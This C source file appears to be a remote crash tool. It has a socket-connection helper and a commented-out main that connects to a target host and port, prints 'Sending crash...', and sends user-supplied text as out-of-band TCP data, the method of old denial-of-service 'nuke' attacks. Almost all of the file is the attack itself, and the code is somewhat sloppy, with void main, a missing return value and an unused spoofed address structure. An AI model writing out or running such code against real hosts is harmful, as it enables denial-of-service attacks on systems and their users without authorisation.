#include <stdio.h>
#include <string.h>
#include <netdb.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <unistd.h>

int x, s;
/*char *str = "65293851961963315";*/
/* Makes no diff */
struct sockaddr_in addr, spoofedaddr;
struct hostent *host;
int resultd;

int open_sock(int sock, char *server, int port)
{
     struct sockaddr_in blah;
     struct hostent *he;
     bzero((char *)&blah, sizeof(blah));
     blah.sin_family = AF_INET;
     blah.sin_addr.s_addr = inet_addr(server);
     blah.sin_port = htons(port);

     if ((he = gethostbyname(server)) != NULL)
     {
          bcopy(he->h_addr, (char *)&blah.sin_addr, he->h_length);
     }
     else
     {
          if ((blah.sin_addr.s_addr = inet_addr(server)) < 0)
          {
               perror("gethostbyname()");
               return (-3);
          }
     }

     if (connect(sock, (struct sockaddr *)&blah, 16) == -1)
     {
          perror("connect()");
          close(sock);
          return (-4);
     }
     printf("Connected to [%s:%d].\n", server, port);
     return;
}
void main(int argc, char *argv[])
{
/*
     if (argc != 4)
     {
          printf("Usage: %s <target> <port> <text>\n", argv[0]);
          exit(0);
     }

     if ((s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == -1)
     {
          perror("socket()");
          exit(-1);
     }

     resultd = atoi(argv[2]);
     printf("%s:%d\n", argv[1], resultd);
     open_sock(s, argv[1], resultd);

     printf("Sending crash... ");
     send(s, argv[3], strlen(argv[3]), MSG_OOB);
     usleep(100000);
     printf("Done!\n");
     close(s);
     */
}